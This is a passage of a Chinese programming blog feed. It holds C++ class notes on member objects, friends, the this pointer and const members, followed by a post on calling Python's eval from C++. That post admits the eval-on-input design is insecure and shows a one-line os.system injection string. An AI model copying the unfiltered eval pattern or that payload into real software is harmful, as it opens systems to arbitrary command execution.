明确对象中的成员对象</p><ul><li>封闭类构造函数的初始化列表</li><li>定义封闭类的构造函数时,添加初始化列表<br>类名::构造函数(参数表):成员变量1(参数表),成员变量2(参数表)<br>{<br>}</li><li>成员对象初始化列表中的参数<ul><li>任意复杂的表达式</li><li>函数/变量/表达式中的函数,变量有定义</li></ul></li><li>调用顺序<br>当封闭类对象生成时,<br>• S1: 执行所有成员对象 的构造函数<br>• S2: 执行 封闭类 的构造函数<br>成员对象的构造函数调用顺序<br>• 和成员对象在类中的说明顺序一致<br>• 与在成员初始化列表中出现的顺序无关<br>当封闭类的对象消亡时,<br>• S1: 先执行 封闭类 的析构函数<br>• S2: 执行 成员对象 的析构函数<br>析构函数顺序和构造函数的调用顺序相反</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTyre</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">CTyre() &#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"CTyre contructor"</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line">~CTyre() &#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"CTyre destructor"</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CEngine</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">CEngine() &#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"CEngine contructor"</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line">~CEngine() &#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"CEngine destructor"</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCar</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">CEngine engine;</span><br><span class="line">CTyre tyre;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">CCar( ) &#123; <span class="built_in">cout</span> &lt;&lt; “CCar contructor” &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line">~CCar() &#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">"CCar destructor"</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">CCar car;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">程序的输出结果是：</span><br><span class="line">CEngine contructor</span><br><span class="line">CTyre contructor</span><br><span class="line">CCar contructor</span><br><span class="line">CCar destructor</span><br><span class="line">CTyre destructor</span><br><span class="line">CEngine destructor</span><br></pre></td></tr></table></figure><h2 id="友元-Friend"><a href="#友元-Friend" class="headerlink" title="友元(Friend)"></a>友元(Friend)</h2><h3 id="友元函数"><a href="#友元函数" class="headerlink" title="友元函数"></a>友元函数</h3><ul><li><p>一个类的友元函数可以访问该类的私有成员</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCar</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CDriver</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ModifyCar</span><span class="params">(CCar * pCar)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCar</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> price;</span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="keyword">int</span> <span class="title">MostEXpensiveCar</span><span class="params">(CCar cars[], <span class="keyword">int</span> total)</span></span>;</span><br><span class="line"><span class="keyword">friend</span> <span class="keyword">void</span> CDriver::ModifyCar(CCar * pCar);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">void</span> CDriver::ModifyCar(CCar * pCar)</span><br><span class="line">&#123;</span><br><span class="line">pCar-&gt;price += <span class="number">1000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MostExpensiveCar</span><span class="params">(CCar cars[], <span class="keyword">int</span> total)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> tmpMax = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; total; ++i)</span><br><span class="line"><span class="keyword">if</span>( cars[i].price &gt; tmpMax)</span><br><span class="line">tmpMax = cars[i].price;</span><br><span class="line"><span class="keyword">return</span> tmpMax;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>将一个类的成员函数(包括构造,析构函数)-&gt;另一个类的友元</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">function</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">friend</span> <span class="keyword">void</span> B::function();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="友元类"><a href="#友元类" class="headerlink" title="友元类"></a>友元类</h3><ul><li>A是B的友元类-&gt;A的成员函数可以访问B的私有成员<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCar</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> price;</span><br><span class="line"><span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">CDriver</span>;</span><span class="comment">//声明CDriver为友元类</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CDriver</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">CCar myCar;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ModifyCar</span><span class="params">()</span></span>&#123;<span class="comment">//改装汽车</span></span><br><span class="line">myCar.price += <span class="number">1000</span>;<span class="comment">//CDriver是CCar的友元类-&gt;可以访问其私有成员</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure></li></ul><p>友元类之间的关系<br>不能传递,不能继承</p><h2 id="this指针"><a href="#this指针" class="headerlink" title="this指针"></a>this指针</h2><ul><li>C++程序到C程序的翻译<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCar</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> price;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetPrice</span><span class="params">(<span class="keyword">int</span> p)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">void</span> CCar::SetPrice(<span class="keyword">int</span> p)</span><br><span class="line">&#123; price = p;&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CCar car;</span><br><span class="line">car.SetPrice(<span class="number">20000</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CCar</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> price;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetPrice</span><span class="params">(struct CCar * <span class="keyword">this</span>, <span class="keyword">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">this</span>-&gt;price = p;&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CCar</span> <span class="title">car</span>;</span></span><br><span class="line">SetPrice(&amp; car, <span class="number">20000</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>this指针作用<br>其作用就是指向成员函数所作用的对象<br>非静态成员函数中可以直接使用this来代表指向该函数作用的对象的指针</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Complex</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">double</span> real,imag;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print</span><span class="params">()</span></span>&#123; <span class="built_in">cout</span>&lt;&lt;real&lt;&lt;<span class="string">","</span>&lt;&lt;imag;&#125;</span><br><span class="line">Complex(<span class="keyword">double</span> r,<span class="keyword">double</span> i):real(r),imag(i)</span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="function">Complex <span class="title">AddOne</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;real++; <span class="comment">//等价于 real++;</span></span><br><span class="line"><span class="keyword">this</span>-&gt;Print();<span class="comment">//等价于Print</span></span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Complex c1(1,1),c2(0,0);</span><br><span class="line">c2 = c1.AddOne();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="comment">//输出2,1</span></span><br></pre></td></tr></table></figure></li><li><p>this指针作用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Hello</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">"hello"</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">&#125;;<span class="comment">//void Hello(A * this)&#123; cout&lt;&lt;"hello"&lt;&lt;endl;&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">A * p = <span class="literal">NULL</span>;</span><br><span class="line">p-&gt;Hello();<span class="comment">//Hello(p);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>输出hello<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">     <span class="function"><span class="keyword">void</span> <span class="title">Hello</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;i&lt;&lt;<span class="string">"hello"</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line"> &#125;;<span class="comment">//void Hello(A * this)&#123; cout&lt;&lt;this-&gt;i&lt;&lt;"hello"&lt;&lt;endl;&#125;</span></span><br><span class="line"> <span class="comment">//this若为NULL,则出错</span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">         A * p = <span class="literal">NULL</span>;</span><br><span class="line">         p-&gt;Hello();<span class="comment">//Hello(p);</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><ul><li>this指针和静态成员函数<br>静态成员函数中不能使用this指针,因为静态成员函数并不具体作用于某个对象,因此,静态成员函数的真实的参数的个数,就是程序中写出的参数个数.</li></ul><h2 id="常量对象-常量成员函数和常引用"><a href="#常量对象-常量成员函数和常引用" class="headerlink" title="常量对象,常量成员函数和常引用"></a>常量对象,常量成员函数和常引用</h2><h3 id="常量对象"><a href="#常量对象" class="headerlink" title="常量对象"></a>常量对象</h3><p>如果不希望某个对象的值被改变,则定义该对象的时候可以在前面加const关键字<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> value;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetValue</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> Demo obj;</span><br></pre></td></tr></table></figure></p><h3 id="常量成员函数"><a href="#常量成员函数" class="headerlink" title="常量成员函数"></a>常量成员函数</h3><p>在类的成员函数说明后面可以加const关键字,则该成员函数成为常量成员函数.<br>常量成员函数执行期间不应修改其所作用的对象,因此,在常量成员函数中不能修改成员变量的值(静态成员变量除外),也不能调用同类的非常量成员函数(静态成员函数除外).<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sample</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> value;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetValue</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">Sample()&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">void</span> Sample::GetValue() <span class="keyword">const</span></span><br><span class="line">&#123;</span><br><span class="line">value = <span class="number">0</span>;<span class="comment">//wrong</span></span><br><span class="line">func();<span class="comment">//wrong</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="keyword">const</span> Sample o</span>;</span><br><span class="line">o.value = <span class="number">100</span>; <span class="comment">//err.常量对象不可被修改</span></span><br><span class="line">o.func();<span class="comment">//err.常量对象上不可执行非常量成员函数</span></span><br><span class="line">o.GetValue();<span class="comment">//ok,常量对象上可以执行常量成员函数</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="常量成员函数的重载"><a href="#常量成员函数的重载" class="headerlink" title="常量成员函数的重载"></a>常量成员函数的重载</h3><p>两个成员函数,名字和参数表都一样,但是一个是const,一个不是,算重载.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTest</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">CTest()&#123;n = <span class="number">1</span>;&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetValue</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;<span class="keyword">return</span> n;&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetValue</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">2</span>*n;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">const</span> CTest objTest1;</span><br><span class="line">CTest objTest2;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;objTest1.GetValue()&lt;&lt;<span class="string">"."</span>&lt;&lt;objTest2.GetValue();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="常引用"><a href="#常引用" class="headerlink" title="常引用"></a>常引用</h3><p>引用前面可以加const关键字,成为常引用.不能通过常引用,修改其引用的变量.</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>C++调用Python</title>
      <link href="/2018/05/25/C-%E8%B0%83%E7%94%A8Python/"/>
      <url>/2018/05/25/C-%E8%B0%83%E7%94%A8Python/</url>
      
        <content type="html"><![CDATA[<p>为了实现一个C++调用python eval函数，实验成功，但是只是能运行，安全问题很大。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_int</span><span class="params">()</span>:</span></span><br><span class="line">    a = <span class="number">10</span></span><br><span class="line">    b = <span class="number">20</span></span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_str</span><span class="params">(s1)</span>:</span></span><br><span class="line">    <span class="comment">#return eval(s1)</span></span><br><span class="line">   <span class="comment"># s3 = s1+s2</span></span><br><span class="line">    s4 = str(eval(s1))</span><br><span class="line">    <span class="keyword">return</span> (s4,<span class="number">10</span>,<span class="number">20</span>)</span><br></pre></td></tr></table></figure></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Python.h&gt;  </span></span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    PyObject *pName, *pModule, *pDict, *pFunc, *pArgs, *pRetVal;  </span><br><span class="line">  </span><br><span class="line">    Py_Initialize();  </span><br><span class="line">      </span><br><span class="line">    <span class="keyword">if</span> (!Py_IsInitialized())  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//load py script filename  </span></span><br><span class="line">    PyRun_SimpleString(<span class="string">"import sys"</span>);  </span><br><span class="line">    PyRun_SimpleString(<span class="string">"sys.path.append('./')"</span>);  </span><br><span class="line">  </span><br><span class="line">    pName = PyString_FromString(<span class="string">"py_test"</span>);<span class="comment">// py_test.py  </span></span><br><span class="line">    pModule = PyImport_Import(pName);  </span><br><span class="line">    <span class="keyword">if</span> (!pModule)&#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"cant find py_test.py"</span>);  </span><br><span class="line">        getchar();  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    pDict = PyModule_GetDict(pModule);  </span><br><span class="line">    <span class="keyword">if</span> (!pDict) <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//find function name  </span></span><br><span class="line">    pFunc = PyDict_GetItemString(pDict, <span class="string">"get_str"</span>);  </span><br><span class="line">    <span class="keyword">if</span> (!pFunc || !PyCallable_Check(pFunc))&#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"cant find function [add]"</span>);  </span><br><span class="line">        getchar();  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//push args to stack  </span></span><br><span class="line">   <span class="comment">// pArgs = PyTuple_New(2);  </span></span><br><span class="line">   <span class="comment">// PyTuple_SetItem(pArgs, 0, Py_BuildValue("s", "1+"));  </span></span><br><span class="line">   <span class="comment">// PyTuple_SetItem(pArgs, 1, Py_BuildValue("s", "2"));  </span></span><br><span class="line">        pArgs = PyTuple_New(<span class="number">1</span>);</span><br><span class="line">    PyTuple_SetItem(pArgs, <span class="number">0</span>, Py_BuildValue(<span class="string">"s"</span>, <span class="string">"3* 2+ 32 //6"</span>));</span><br><span class="line">   <span class="comment">// PyTuple_SetItem(pArgs, 1, Py_BuildValue("s", "2"));</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">//call python function  </span></span><br><span class="line">    pRetVal = PyObject_CallObject(pFunc, pArgs);  </span><br><span class="line">    <span class="keyword">if</span> (pRetVal == <span class="literal">NULL</span>)&#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"CalllObject return NULL"</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">char</span>* ret_str;  </span><br><span class="line">    <span class="keyword">int</span> w = <span class="number">0</span> , h = <span class="number">0</span>;  </span><br><span class="line">    <span class="comment">//解析元组  </span></span><br><span class="line">    PyArg_ParseTuple(pRetVal, <span class="string">"s,i,i"</span>,&amp;ret_str,&amp;w,&amp;h);  </span><br><span class="line">      </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, ret_str);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//解析字符串  </span></span><br><span class="line">   <span class="comment">// printf("function return value:%s\r\n", PyString_AsString(pRetVal));  </span></span><br><span class="line">  </span><br><span class="line">    Py_DECREF(pName);  </span><br><span class="line">    Py_DECREF(pArgs);  </span><br><span class="line">    Py_DECREF(pModule);  </span><br><span class="line">    Py_DECREF(pRetVal);  </span><br><span class="line">    <span class="comment">//close python  </span></span><br><span class="line">    Py_Finalize();  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>g++ callpy1.cpp -o callpy1 -I/usr/include/python2.7 -L/usr/lib/ -lpython2.7</code></p><p>可以把程序改成获取用户输入的表达式，然后由C++调用python的eval函数进行执行。<br>这样就会很明显的出现，如果对输入没有进行过滤，很简单就可以执行系统命令。<br><code>eval(&#39;__imort__(&quot;os&quot;).system(&quot;dir&quot;)&#39;)</code><br>那么怎么过滤和怎么绕过过滤就是有时间需要研究的了。<br>又开一个坑。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>64位Linux编译32位程序</title>
      <link href="/2018/05/22/64%E4%BD%8DLinux%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F/"/>
      <url>/2018/05/22/64%E4%BD%8DLinux%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F/</url>
      
